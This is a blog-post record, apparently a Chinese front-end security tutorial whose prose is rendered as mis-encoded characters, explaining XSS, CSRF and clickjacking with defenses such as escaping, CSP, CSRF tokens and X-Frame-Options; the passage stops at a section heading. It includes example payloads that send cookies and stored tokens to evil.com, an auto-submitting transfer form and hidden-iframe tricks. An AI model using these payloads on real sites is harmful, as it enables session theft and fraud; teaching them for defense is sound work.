{
  "title": "æ´æ‚‰Webå®‰å…¨ï¼šæ·±å…¥å‰–æXSSã€CSRFä¸ç‚¹å‡»åŠ«æŒçš„è‰ºæœ¯ä¸å“²å­¦",
  "date": "2022-11-22T00:00:00.000Z",
  "description": "å…¨é¢è§£æXSSã€CSRFå’Œç‚¹å‡»åŠ«æŒçš„åŸç†ã€æ”»å‡»æ‰‹æ³•ä¸é˜²å¾¡ç­–ç•¥ï¼Œç»“åˆå®ä¾‹ã€æœ€ä½³å®è·µå’Œæ¶æ„æ€è€ƒï¼Œä¸ºå‰ç«¯å¼€å‘è€…æä¾›æ·±åº¦æŒ‡å—ã€‚",
  "keywords": "Webå®‰å…¨, XSS, CSRF, ç‚¹å‡»åŠ«æŒ, å‰ç«¯å¼€å‘, å®‰å…¨æ¶æ„, é˜²å¾¡ç­–ç•¥, ç¼–ç è§„èŒƒ",
  "author": "æ™“é¾™",
  "image": "/images/hero/web_security.jpg",
  "tags": [
    "Webå®‰å…¨",
    "å‰ç«¯å¼€å‘",
    "å®‰å…¨æ¶æ„"
  ],
  "views": 0,
  "likes": 0,
  "category": "å‰ç«¯æŠ€æœ¯",
  "body": {
    "raw": "\n> â€œå‡¡äº‹é¢„åˆ™ç«‹ï¼Œä¸é¢„åˆ™åºŸã€‚â€ â€”â€”ã€Šç¤¼è®°Â·ä¸­åº¸ã€‹  \n\nåœ¨Webå¼€å‘çš„æµ©ç€šæ˜Ÿæµ·ä¸­ï¼Œå®‰å…¨å¦‚åŒä¸€åº§ç¯å¡”ï¼ŒæŒ‡å¼•æˆ‘ä»¬é¿å¼€æš—ç¤ä¸é£æµªã€‚XSSã€CSRFå’Œç‚¹å‡»åŠ«æŒï¼Œè¿™äº›æ½œè—åœ¨ä»£ç æ·±å¤„çš„å¹½çµï¼Œæ—¢æ˜¯æŒ‘æˆ˜ï¼Œä¹Ÿæ˜¯é€šå‘å“è¶Šçš„è¯•ç‚¼åœºã€‚æœ¬æ–‡å°†ä»¥æ·±å…¥æµ…å‡ºçš„æ–¹å¼ï¼Œå¸¦ä½ èµ°è¿›è¿™äº›å®‰å…¨å¨èƒçš„æœ¬è´¨ï¼Œæ¢ç´¢é˜²å¾¡çš„è‰ºæœ¯ä¸å“²å­¦ï¼ŒåŠ©ä½ æˆä¸ºæ›´å…¨é¢çš„å‰ç«¯å¼€å‘è€…ã€‚ğŸ˜\n\n## å¼•è¨€ï¼šå®‰å…¨çš„è¯—æ„ä¸å“²å­¦\n\nWebå¼€å‘å¦‚åŒä¸€åœºç››å¤§çš„äº¤å“ä¹ï¼Œå‰ç«¯å¼€å‘è€…æ˜¯è°±å†™æ—‹å¾‹çš„ä¹æ‰‹ï¼Œè€Œå®‰å…¨åˆ™æ˜¯é‚£ä¸å¯æˆ–ç¼ºçš„èŠ‚æ‹å™¨ã€‚XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰ã€CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰å’Œç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰ï¼Œè¿™ä¸‰å¤§å¨èƒå¦‚åŒä¹ç« ä¸­çš„ä¸å’Œè°éŸ³ç¬¦ï¼Œè‹¥ä¸å¦¥å–„å¤„ç†ï¼Œä¾¿å¯èƒ½æ¯æ‰æ•´åœºæ¼”å‡ºã€‚å®ƒä»¬ä¸ä»…æ˜¯æŠ€æœ¯é—®é¢˜ï¼Œæ›´å…³ä¹æ¶æ„è®¾è®¡ã€ç”¨æˆ·ä¿¡ä»»å’Œå¼€å‘è€…çš„è´£ä»»æ„Ÿã€‚\n\n> â€œä»£ç æ˜¯è¯—ï¼Œå®‰å…¨æ˜¯éŸµã€‚â€ â€”â€” åŒ¿åå¼€å‘è€…\n\næœ¬æ–‡å°†ä»¥æ¸…æ™°çš„é€»è¾‘é“¾ï¼Œå¸¦ä½ ä»åŸç†åˆ°å®è·µã€ä»æŠ€æœ¯åˆ°å“²å­¦ï¼Œå…¨é¢å‰–æè¿™ä¸‰å¤§å¨èƒã€‚æˆ‘ä»¬å°†ç»“åˆå®ä¾‹ã€è¡¨æ ¼ã€æœ€ä½³å®è·µï¼Œç”šè‡³ä¸€äº›ç±»æ¯”å’Œå¹½é»˜ï¼Œè®©ä½ è¯»æ¥æ—¢å®ç”¨åˆæ„‰æ‚¦ã€‚å‡†å¤‡å¥½ä½ çš„é”®ç›˜ï¼Œç³»å¥½å®‰å…¨å¸¦ï¼Œè®©æˆ‘ä»¬å¼€å§‹è¿™åœºå®‰å…¨ä¹‹æ—…å§ï¼ğŸš€\n\n## ä¸€ã€XSSï¼šå½“ä»£ç å˜æˆâ€œæ¶ä½œå‰§å°ä¸‘â€ ğŸ¤¡\n\n### 1.1 XSSæ˜¯ä»€ä¹ˆï¼Ÿ\n\nè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scriptingï¼Œç®€ç§°XSSï¼‰æ˜¯ä¸€ç§é€šè¿‡åœ¨ç½‘é¡µä¸­æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ã€ç¯¡æ”¹é¡µé¢æˆ–æ‰§è¡Œæ¶æ„æ“ä½œçš„æ”»å‡»æ–¹å¼ã€‚å®ƒçš„æœ¬è´¨æ˜¯**è¾“å…¥æœªè¢«æ­£ç¡®å¤„ç†**ï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«å½“ä½œæ­£å¸¸è„šæœ¬æ‰§è¡Œã€‚\n\nç±»æ¯”ä¸€ä¸‹ï¼ŒXSSå°±åƒä¸€ä¸ªâ€œæ¶ä½œå‰§å°ä¸‘â€ï¼šä½ æœ¬ä»¥ä¸ºå®ƒåªæ˜¯ä¸ªæ— å®³çš„è¯„è®ºæ¡†ï¼Œå´ä¸çŸ¥å®ƒå·å·å¡è¿›äº†â€œå“ˆå“ˆï¼Œæˆ‘è¦å·ä½ Cookieâ€çš„å‰§æœ¬ã€‚ğŸ­\n\nXSSå¯åˆ†ä¸ºä¸‰ç±»ï¼š\n\n| ç±»å‹           | æè¿°                                                                 | å±å®³ç¨‹åº¦ | å…¸å‹åœºæ™¯                     |\n|----------------|----------------------------------------------------------------------|----------|------------------------------|\n| åå°„å‹XSS      | æ¶æ„è„šæœ¬é€šè¿‡URLå‚æ•°ä¼ é€’ï¼Œéœ€è¯±å¯¼ç”¨æˆ·ç‚¹å‡»è§¦å‘                           | ä¸­       | é’“é±¼é“¾æ¥ã€ä¼ªé€ æœç´¢ç»“æœ       |\n| å­˜å‚¨å‹XSS      | æ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼ˆå¦‚æ•°æ®åº“ï¼‰ï¼Œæ¯æ¬¡è®¿é—®é¡µé¢éƒ½ä¼šæ‰§è¡Œ               | é«˜       | è®ºå›è¯„è®ºã€ç”¨æˆ·ç®€ä»‹           |\n| DOMå‹XSS       | æ¶æ„è„šæœ¬é€šè¿‡å®¢æˆ·ç«¯JavaScriptç›´æ¥æ“ä½œDOMè§¦å‘ï¼Œæ— éœ€æœåŠ¡å™¨äº¤äº’          | ä¸­       | å•é¡µåº”ç”¨ã€åŠ¨æ€å†…å®¹æ¸²æŸ“       |\n\n*å°Tipsï¼šåå°„å‹XSSä¾èµ–ç”¨æˆ·ç‚¹å‡»ï¼Œå­˜å‚¨å‹XSSæ›´åƒâ€œå®šæ—¶ç‚¸å¼¹â€ï¼Œè€ŒDOMå‹XSSåˆ™æ˜¯â€œå‰ç«¯è‡ªå·±çš„é”…â€ã€‚æ£€æŸ¥è¾“å…¥ã€è¾“å‡ºå’ŒDOMæ“ä½œæ˜¯å…³é”®ï¼*\n\n### 1.2 XSSçš„åŸç†ï¼šä¿¡ä»»çš„èƒŒå›\n\nXSSçš„æ ¸å¿ƒåœ¨äº**æµè§ˆå™¨å¯¹è„šæœ¬çš„ä¿¡ä»»**ã€‚å½“ç”¨æˆ·è¾“å…¥çš„æ•°æ®æœªç»è½¬ä¹‰ç›´æ¥æ’å…¥åˆ°HTMLã€JavaScriptæˆ–CSSä¸­ï¼Œæµè§ˆå™¨ä¼šå°†å…¶è§†ä¸ºåˆæ³•ä»£ç æ‰§è¡Œã€‚ä¾‹å¦‚ï¼š\n\n```html\n<div>{userInput}</div>\n```\n\nå¦‚æœ `userInput` æ˜¯ `<script>alert('Hacked!')</script>`ï¼Œæµè§ˆå™¨ä¼šä¹–ä¹–æ‰§è¡Œï¼Œå¼¹å‡ºâ€œHacked!â€ã€‚æ›´å¯æ€•çš„æ˜¯ï¼Œæ”»å‡»è€…å¯èƒ½çªƒå– `document.cookie` æˆ–å‘èµ·æ¶æ„è¯·æ±‚ã€‚\n\n> â€œä¿¡ä»»æ˜¯æŠŠåŒåˆƒå‰‘ï¼Œè¿‡åº¦ä¿¡ä»»åˆ™è‡ªæ˜åŸå¢“ã€‚â€ â€”â€” æŸå®‰å…¨ä¸“å®¶\n\n### 1.3 XSSæ”»å‡»å®ä¾‹ï¼šä»å¼¹çª—åˆ°çªƒå¯†\n\n#### å®ä¾‹1ï¼šåå°„å‹XSS\næ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼š\n```\nhttp://example.com/search?q=<script>document.location='http://evil.com?cookie='+document.cookie</script>\n```\nç”¨æˆ·ç‚¹å‡»åï¼Œè„šæœ¬æ‰§è¡Œï¼ŒCookieè¢«å‘é€åˆ° `evil.com`ã€‚\n\n#### å®ä¾‹2ï¼šå­˜å‚¨å‹XSS\næ”»å‡»è€…åœ¨è®ºå›è¯„è®ºä¸­è¾“å…¥ï¼š\n```html\n<img src=\"x\" onerror=\"fetch('http://evil.com/steal?data='+localStorage.getItem('token'))\">\n```\næ¯æ¬¡ç”¨æˆ·è®¿é—®è¯¥é¡µé¢ï¼Œè„šæœ¬éƒ½ä¼šçªƒå–æœ¬åœ°å­˜å‚¨çš„Tokenã€‚\n\n#### å®ä¾‹3ï¼šDOMå‹XSS\nå‰ç«¯ä»£ç ï¼š\n```javascript\ndocument.getElementById('output').innerHTML = window.location.hash.slice(1);\n```\næ”»å‡»è€…æ„é€ URLï¼š\n```\nhttp://example.com/#<script>alert('Hacked!')</script>\n```\nè„šæœ¬ç›´æ¥åœ¨å®¢æˆ·ç«¯æ‰§è¡Œã€‚\n\n*å°Tipsï¼šæ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·è¾“å…¥ï¼æ— è®ºæ˜¯URLã€è¡¨å•è¿˜æ˜¯æœ¬åœ°å­˜å‚¨ï¼Œéƒ½è¦ç»è¿‡ä¸¥æ ¼æ ¡éªŒå’Œè½¬ä¹‰ã€‚*\n\n### 1.4 XSSé˜²å¾¡ï¼šæ„å»ºåšå›ºçš„åŸå¢™ ğŸ°\n\né˜²å¾¡XSSçš„å…³é”®æ˜¯**è¾“å…¥éªŒè¯**ã€**è¾“å‡ºè½¬ä¹‰**å’Œ**å®‰å…¨ç­–ç•¥**ã€‚ä»¥ä¸‹æ˜¯æœ€ä½³å®è·µï¼š\n\n| é˜²å¾¡æªæ–½                | æè¿°                                                                 | é€‚ç”¨åœºæ™¯                     |\n|-------------------------|----------------------------------------------------------------------|------------------------------|\n| è¾“å…¥éªŒè¯                | é™åˆ¶è¾“å…¥æ ¼å¼ï¼ˆå¦‚åªå…è®¸å­—æ¯æ•°å­—ï¼‰ï¼Œæ‹’ç»å¯ç–‘å†…å®¹                       | è¡¨å•ã€URLå‚æ•°                |\n| è¾“å‡ºè½¬ä¹‰                | å°†ç”¨æˆ·è¾“å…¥è½¬ä¹‰ä¸ºå®‰å…¨å­—ç¬¦ï¼ˆå¦‚ `<` è½¬ä¸º `&lt;`ï¼‰                       | HTMLã€å±æ€§ã€JavaScriptã€CSS  |\n| ä½¿ç”¨å®‰å…¨çš„API           | ä½¿ç”¨ `textContent` è€Œé `innerHTML`ï¼Œé¿å…ç›´æ¥DOMæ“ä½œ                  | å•é¡µåº”ç”¨ã€åŠ¨æ€æ¸²æŸ“           |\n| Content Security Policy | é€šè¿‡CSPé™åˆ¶è„šæœ¬æ¥æºï¼Œç¦ç”¨ `eval` å’Œå†…è”è„šæœ¬                          | æ‰€æœ‰Webåº”ç”¨                  |\n| HttpOnly Cookie         | è®¾ç½®Cookieä¸ºHttpOnlyï¼Œé˜²æ­¢è„šæœ¬è®¿é—®                                   | æ•æ„Ÿæ•°æ®ä¿æŠ¤                 |\n\n#### ä»£ç ç¤ºä¾‹ï¼šå®‰å…¨çš„è¾“å‡ºè½¬ä¹‰\n```javascript\nfunction escapeHTML(str) {\n  return str.replace(/[&<>\"']/g, match => ({\n    '&': '&amp;',\n    '<': '&lt;',\n    '>': '&gt;',\n    '\"': '&quot;',\n    \"'\": '&#39;'\n  })[match]);\n}\n\ndocument.getElementById('output').textContent = escapeHTML(userInput);\n```\n\n*å°Tipsï¼šä½¿ç”¨æˆç†Ÿçš„åº“å¦‚ `DOMPurify` è¿›è¡Œè½¬ä¹‰ï¼Œèƒ½æ˜¾è‘—é™ä½å‡ºé”™é£é™©ã€‚*\n\n### 1.5 XSSçš„å“²å­¦ï¼šä¿¡ä»»ä¸è´£ä»»\n\nXSSä¸ä»…æ˜¯ä¸€ä¸ªæŠ€æœ¯é—®é¢˜ï¼Œæ›´æ˜¯ä¸€ä¸ªå…³äºä¿¡ä»»ä¸è´£ä»»çš„å“²å­¦å‘½é¢˜ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œæˆ‘ä»¬éœ€è¦åƒå®ˆæŠ¤åŸæ± çš„å°†å†›ï¼Œæ—¶åˆ»è­¦æƒ•å¤–éƒ¨è¾“å…¥çš„â€œæœ¨é©¬â€ã€‚åŒæ—¶ï¼Œè®¾è®¡å®‰å…¨çš„æ¶æ„éœ€è¦ä»å…¨å±€å‡ºå‘ï¼Œè€ƒè™‘æ¯ä¸€å±‚ï¼ˆå‰ç«¯ã€åç«¯ã€æµè§ˆå™¨ï¼‰çš„èŒè´£åˆ†é…ã€‚\n\n> â€œä»£ç æ— ç½ªï¼Œä¿¡ä»»æœ‰ä»·ã€‚â€ â€”â€” åŸåˆ›\n\nåœ¨Reactã€Vueç­‰ç°ä»£æ¡†æ¶ä¸­ï¼Œè‡ªåŠ¨è½¬ä¹‰ï¼ˆå¦‚Reactçš„JSXï¼‰é™ä½äº†XSSé£é™©ï¼Œä½†ä¸æ„å‘³ç€ä¸‡æ— ä¸€å¤±ã€‚å¼€å‘è€…éœ€ä¿æŒâ€œé›¶ä¿¡ä»»â€å¿ƒæ€ï¼Œç¡®ä¿æ¯ä¸ªç¯èŠ‚éƒ½ç»è¿‡æ ¡éªŒã€‚\n\n## äºŒã€CSRFï¼šéšå½¢çš„â€œä¼ªè£…è€…â€ ğŸ•µï¸â€â™‚ï¸\n\n### 2.1 CSRFæ˜¯ä»€ä¹ˆï¼Ÿ\n\nè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site Request Forgeryï¼Œç®€ç§°CSRFï¼‰æ˜¯ä¸€ç§è¯±å¯¼ç”¨æˆ·åœ¨å·²è®¤è¯çš„ç½‘ç«™ä¸Šæ‰§è¡Œéé¢„æœŸæ“ä½œçš„æ”»å‡»ã€‚æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨çš„è‡ªåŠ¨æºå¸¦Cookieæœºåˆ¶ï¼Œä¼ªé€ åˆæ³•è¯·æ±‚ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚\n\nç±»æ¯”ä¸€ä¸‹ï¼ŒCSRFå°±åƒä¸€ä¸ªâ€œä¼ªè£…è€…â€ï¼šå®ƒå†’å……ä½ ï¼Œå‘é“¶è¡Œå–Šâ€œè½¬è´¦100ä¸‡ç»™æˆ‘â€ï¼Œè€Œé“¶è¡Œå› ä¸ºè®¤å‡ºäº†ä½ çš„â€œèº«ä»½è¯â€ï¼ˆCookieï¼‰ï¼Œå°±çœŸçš„è½¬äº†é’±ã€‚ğŸ˜±\n\n### 2.2 CSRFçš„åŸç†ï¼šCookieçš„â€œèƒŒé”…ä¾ â€\n\nCSRFçš„æ ¸å¿ƒåœ¨äº**æµè§ˆå™¨çš„Cookieè‡ªåŠ¨å‘é€æœºåˆ¶**ã€‚å½“ç”¨æˆ·ç™»å½•ç½‘ç«™Aåï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä¸ºåç»­è¯·æ±‚é™„å¸¦Cookieã€‚æ”»å‡»è€…è¯±å¯¼ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™Bï¼ŒBå‘èµ·å¯¹Açš„è¯·æ±‚ï¼Œæµè§ˆå™¨è‡ªåŠ¨é™„å¸¦Açš„Cookieï¼Œå¯¼è‡´è¯·æ±‚è¢«è§†ä¸ºåˆæ³•ã€‚\n\nä¾‹å¦‚ï¼Œç”¨æˆ·ç™»å½•é“¶è¡Œç½‘ç«™åï¼Œè®¿é—®æ¶æ„é¡µé¢ï¼š\n```html\n<img src=\"http://bank.com/transfer?to=evil&amount=1000000\">\n```\né“¶è¡ŒæœåŠ¡å™¨æ”¶åˆ°å¸¦Cookieçš„è¯·æ±‚ï¼Œè¯¯ä»¥ä¸ºæ˜¯ç”¨æˆ·å‘èµ·ï¼Œæ‰§è¡Œè½¬è´¦ã€‚\n\n*å°Tipsï¼šCSRFçš„å…³é”®æ˜¯â€œä¼ªé€ è¯·æ±‚+è‡ªåŠ¨Cookieâ€ã€‚é˜²å¾¡æ—¶è¦æ‰“ç ´è¿™ç§â€œä¿¡ä»»é“¾â€ã€‚*\n\n### 2.3 CSRFæ”»å‡»å®ä¾‹ï¼šä»è½¬è´¦åˆ°åˆ å¸–\n\n#### å®ä¾‹1ï¼šé“¶è¡Œè½¬è´¦\næ”»å‡»è€…å‘é€é’“é±¼é‚®ä»¶ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ï¼š\n```html\n<form action=\"http://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"evil\" />\n  <input type=\"hidden\" name=\"amount\" value=\"1000000\" />\n</form>\n<script>document.forms[0].submit();</script>\n```\nç”¨æˆ·ç‚¹å‡»åï¼Œæµè§ˆå™¨è‡ªåŠ¨å‘é€POSTè¯·æ±‚ï¼Œå®Œæˆè½¬è´¦ã€‚\n\n#### å®ä¾‹2ï¼šè®ºå›åˆ å¸–\næ”»å‡»è€…åœ¨è®ºå›åµŒå…¥ï¼š\n```html\n<img src=\"http://forum.com/delete?postId=123\">\n```\nç”¨æˆ·è®¿é—®é¡µé¢æ—¶ï¼Œå¸–å­è¢«åˆ é™¤ã€‚\n\n*å°Tipsï¼šGETè¯·æ±‚å®¹æ˜“è¢«CSRFåˆ©ç”¨ï¼Œæ•æ„Ÿæ“ä½œå°½é‡ç”¨POSTå¹¶åŠ é˜²æŠ¤ã€‚*\n\n### 2.4 CSRFé˜²å¾¡ï¼šæ‰“ç ´ä¼ªè£…çš„è‰ºæœ¯ ğŸ­\n\né˜²å¾¡CSRFçš„æ ¸å¿ƒæ˜¯**éªŒè¯è¯·æ±‚çš„åˆæ³•æ€§**ã€‚ä»¥ä¸‹æ˜¯æœ€ä½³å®è·µï¼š\n\n| é˜²å¾¡æªæ–½                | æè¿°                                                                 | é€‚ç”¨åœºæ™¯                     |\n|-------------------------|----------------------------------------------------------------------|------------------------------|\n| CSRF Token              | ä¸ºæ¯ä¸ªä¼šè¯ç”Ÿæˆå”¯ä¸€Tokenï¼Œæäº¤æ—¶éªŒè¯                                   | è¡¨å•æäº¤ã€AJAXè¯·æ±‚           |\n| SameSite Cookie         | è®¾ç½®Cookieä¸º `SameSite=Strict` æˆ– `Lax`ï¼Œé™åˆ¶è·¨ç«™å‘é€                 | æ‰€æœ‰Cookie                   |\n| éªŒè¯Origin/Header       | æ£€æŸ¥è¯·æ±‚çš„ `Origin` æˆ– `Referer` å¤´ï¼Œç¡®ä¿æ¥æºåˆæ³•                     | APIè¯·æ±‚                      |\n| äºŒæ¬¡éªŒè¯                | æ•æ„Ÿæ“ä½œï¼ˆå¦‚è½¬è´¦ï¼‰è¦æ±‚ç”¨æˆ·å†æ¬¡è¾“å…¥å¯†ç                                | é«˜é£é™©æ“ä½œ                   |\n\n#### ä»£ç ç¤ºä¾‹ï¼šCSRF Token\nåç«¯ç”ŸæˆTokenï¼š\n```javascript\nconst csrfToken = crypto.randomUUID();\nres.cookie('csrfToken', csrfToken, { httpOnly: true });\n```\n\nå‰ç«¯è¡¨å•ï¼š\n```html\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"_csrf\" value=\"<%= csrfToken %>\">\n  <input type=\"text\" name=\"amount\">\n  <button type=\"submit\">æäº¤</button>\n</form>\n```\n\nåç«¯éªŒè¯ï¼š\n```javascript\nif (req.body._csrf !== req.cookies.csrfToken) {\n  return res.status(403).send('Invalid CSRF Token');\n}\n```\n\n*å°Tipsï¼šä½¿ç”¨æ¡†æ¶ï¼ˆå¦‚Expressçš„`csurf`ä¸­é—´ä»¶ï¼‰èƒ½ç®€åŒ–CSRFé˜²æŠ¤ï¼Œä½†ä»éœ€æ£€æŸ¥é…ç½®ã€‚*\n\n### 2.5 CSRFçš„å“²å­¦ï¼šæƒé™ä¸è¾¹ç•Œ\n\nCSRFæé†’æˆ‘ä»¬ï¼ŒWebå®‰å…¨çš„æœ¬è´¨æ˜¯**æƒé™ç®¡ç†**ã€‚Cookieçš„è‡ªåŠ¨å‘é€æœºåˆ¶æ˜¯ä¾¿åˆ©ä¸é£é™©çš„å¹³è¡¡ï¼Œè€ŒCSRFåˆ™æ˜¯å¯¹è¿™ç§ä¾¿åˆ©çš„æ»¥ç”¨ã€‚å¼€å‘è€…éœ€è¦æ˜ç¡®æ¯ä¸ªè¯·æ±‚çš„è¾¹ç•Œï¼Œç¡®ä¿â€œè°åœ¨æ“ä½œâ€å¾—åˆ°éªŒè¯ã€‚\n\n> â€œæƒé™æ˜¯è‡ªç”±çš„ä»£ä»·ï¼Œè¾¹ç•Œæ˜¯å®‰å…¨çš„åŸºçŸ³ã€‚â€ â€”â€” åŸåˆ›\n\nåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒCSRFé˜²æŠ¤éœ€è¦ä¸APIç½‘å…³ã€è®¤è¯ç³»ç»ŸååŒï¼Œç¡®ä¿è·¨åŸŸè¯·æ±‚çš„å®‰å…¨æ€§ã€‚è¿™ä¸ä»…æ˜¯æŠ€æœ¯é—®é¢˜ï¼Œæ›´æ˜¯è®¾è®¡å“²å­¦çš„ä½“ç°ã€‚\n\n## ä¸‰ã€ç‚¹å‡»åŠ«æŒï¼šUIçš„â€œéšœçœ¼æ³•â€ ğŸª„\n\n### 3.1 ç‚¹å‡»åŠ«æŒæ˜¯ä»€ä¹ˆï¼Ÿ\n\nç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰æ˜¯ä¸€ç§é€šè¿‡æ¬ºéª—ç”¨æˆ·ç‚¹å‡»éšè—æˆ–ä¼ªè£…çš„UIå…ƒç´ ï¼Œè¯±å¯¼æ‰§è¡Œéé¢„æœŸæ“ä½œçš„æ”»å‡»ã€‚æ”»å‡»è€…é€šå¸¸ä½¿ç”¨é€æ˜çš„iframeè¦†ç›–åˆæ³•é¡µé¢ï¼Œæ•è·ç”¨æˆ·ç‚¹å‡»ã€‚\n\nç±»æ¯”ä¸€ä¸‹ï¼Œç‚¹å‡»åŠ«æŒå°±åƒä¸€ä¸ªâ€œéšœçœ¼æ³•â€é­”æœ¯å¸ˆï¼šä½ ä»¥ä¸ºä½ åœ¨ç‚¹â€œé¢†å–ä¼˜æƒ åˆ¸â€ï¼Œå®é™…ä¸Šå´ç‚¹äº†ä¸ªâ€œè®¢é˜…ä»˜è´¹æœåŠ¡â€ã€‚ğŸ©\n\n### 3.2 ç‚¹å‡»åŠ«æŒçš„åŸç†ï¼šè§†è§‰çš„æ¬ºéª—\n\nç‚¹å‡»åŠ«æŒçš„æ ¸å¿ƒåœ¨äº**UIæ¬ºéª—**ã€‚æ”»å‡»è€…é€šè¿‡CSSï¼ˆå¦‚ `opacity: 0`ï¼‰éšè—iframeï¼Œå°†æ¶æ„é¡µé¢å åŠ åœ¨åˆæ³•é¡µé¢ä¸Šã€‚ç”¨æˆ·ç‚¹å‡»æ—¶ï¼Œå®é™…è§¦å‘äº†iframeä¸­çš„æ“ä½œã€‚\n\nä¾‹å¦‚ï¼š\n```html\n<iframe src=\"http://bank.com/transfer?to=evil\" style=\"opacity: 0; position: absolute;\"></iframe>\n<div>ç‚¹å‡»é¢†å–ä¼˜æƒ åˆ¸ï¼</div>\n```\n\nç”¨æˆ·ç‚¹å‡»â€œä¼˜æƒ åˆ¸â€ï¼Œå®é™…è§¦å‘äº†è½¬è´¦ã€‚\n\n*å°Tipsï¼šç‚¹å‡»åŠ«æŒä¾èµ–è§†è§‰æ¬ºéª—ï¼Œé˜²å¾¡æ—¶è¦é™åˆ¶iframeçš„ä½¿ç”¨ã€‚*\n\n### 3.3 ç‚¹å‡»åŠ«æŒæ”»å‡»å®ä¾‹ï¼šä»ç‚¹èµåˆ°æˆæƒ\n\n#### å®ä¾‹1ï¼šç¤¾äº¤åª’ä½“ç‚¹èµ\næ”»å‡»è€…åµŒå…¥ï¼š\n```html\n<iframe src=\"http://social.com/like?postId=evil\" style=\"opacity: 0;\"></iframe>\n```\nç”¨æˆ·ç‚¹å‡»é¡µé¢ï¼Œå®é™…ä¸ºæ¶æ„å¸–å­ç‚¹èµã€‚\n\n#### å®ä¾‹2ï¼šOAuthæˆæƒ\næ”»å‡»è€…ä¼ªé€ æˆæƒé¡µé¢ï¼š\n```html\n<iframe src=\"http://app.com/authorize?client_id=evil\" style=\"opacity: 0;\"></iframe>\n```\nç”¨æˆ·ç‚¹å‡»åï¼Œæ— æ„ä¸­æˆæƒäº†æ¶æ„åº”ç”¨ã€‚\n\n*å°Tipsï¼šæ•æ„Ÿæ“ä½œçš„UIåº”æ˜ç¡®æç¤ºç”¨æˆ·ï¼Œé¿å…â€œéšå½¢ç‚¹å‡»â€ã€‚*\n\n### 3.4 ç‚¹å‡»åŠ«æŒé˜²å¾¡ï¼šå®ˆæŠ¤ç”¨æˆ·çš„æ¯ä¸€æ¬¡ç‚¹å‡» ğŸ–±ï¸\n\né˜²å¾¡ç‚¹å‡»åŠ«æŒçš„å…³é”®æ˜¯**é™åˆ¶iframe**å’Œ**æ˜ç¡®ç”¨æˆ·æ„å›¾**ã€‚ä»¥ä¸‹æ˜¯æœ€ä½³å®è·µï¼š\n\n| é˜²å¾¡æªæ–½                | æè¿°                                                                 | é€‚ç”¨åœºæ™¯                     |\n|-------------------------|----------------------------------------------------------------------|------------------------------|\n| X-Frame-Options         | è®¾ç½®å“åº”å¤´ä¸º `DENY` æˆ– `SAMEORIGIN`ï¼Œç¦æ­¢é¡µé¢è¢«iframeåµŒå…¥            | æ‰€æœ‰é¡µé¢                     |\n| Content Security Policy | ä½¿ç”¨ `frame-ancestors` é™åˆ¶iframeæ¥æº                                | ç°ä»£æµè§ˆå™¨                   |\n| JavaScriptæ£€æµ‹          | æ£€æµ‹é¡µé¢æ˜¯å¦è¢«iframeåµŒå…¥ï¼ˆå¦‚æ£€æŸ¥ `window.top !== window`ï¼‰            | åŠ¨æ€é¡µé¢                     |\n| UIæ˜ç¡®æ€§                | æ•æ„Ÿæ“ä½œéœ€ç”¨æˆ·æ˜ç¡®äº¤äº’ï¼ˆå¦‚æ‹–æ‹½ã€è¾“å…¥éªŒè¯ç ï¼‰                          | é«˜é£é™©æ“ä½œ                   |\n\n#### ä»£ç ç¤ºä¾‹ï¼šX-Frame-Options\nåç«¯è®¾ç½®ï¼š\n```javascript\nres.setHeader('X-Frame-Options', 'DENY');\n```\n\nJavaScriptæ£€æµ‹ï¼š\n```javascript\nif (window.top !== window.self) {\n  document.body.innerHTML = 'æ­¤é¡µé¢ä¸å…è®¸åµŒå…¥iframeï¼';\n}\n```\n\n*å°Tipsï¼šX-Frame-Optionsæ˜¯è€ç‰Œé˜²å¾¡æ‰‹æ®µï¼Œä½†CSPæ›´çµæ´»ï¼Œæ¨èç»“åˆä½¿ç”¨ã€‚*\n\n### 3.5 ç‚¹å‡»åŠ«æŒçš„å“²å­¦ï¼šé€æ˜ä¸çœŸå®\n\nç‚¹å‡»åŠ«æŒè®©æˆ‘ä»¬åæ€**é€æ˜æ€§**çš„é‡è¦æ€§ã€‚ç”¨æˆ·ç•Œé¢ä¸ä»…æ˜¯åŠŸèƒ½çš„è½½ä½“ï¼Œæ›´æ˜¯ä¿¡ä»»çš„æ¡¥æ¢ã€‚å¼€å‘è€…éœ€è¦ç¡®ä¿æ¯ä¸€æ¬¡ç‚¹å‡»éƒ½çœŸå®åæ˜ ç”¨æˆ·æ„å›¾ï¼Œè¿™ä¸ä»…æ˜¯æŠ€æœ¯è¦æ±‚ï¼Œæ›´æ˜¯ç”¨æˆ·ä½“éªŒçš„å“²å­¦ã€‚\n\n> â€œçœŸå®æ˜¯ä¿¡ä»»çš„èµ·ç‚¹ï¼Œé€æ˜æ˜¯å®‰å…¨çš„å½’å®¿ã€‚â€ â€”â€” åŸåˆ›\n\nåœ¨è®¾è®¡ç³»ç»Ÿæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä»ç”¨æˆ·è§†è§’å‡ºå‘ï¼Œå‡å°‘â€œéšå½¢â€æ“ä½œï¼Œç¡®ä¿äº¤äº’çš„æ¯ä¸€æ­¥éƒ½æ¸…æ™°å¯æ§ã€‚\n\n## å››ã€ç»¼åˆé˜²å¾¡ï¼šæ¶æ„å±‚é¢çš„å®‰å…¨ä¹‹é“ 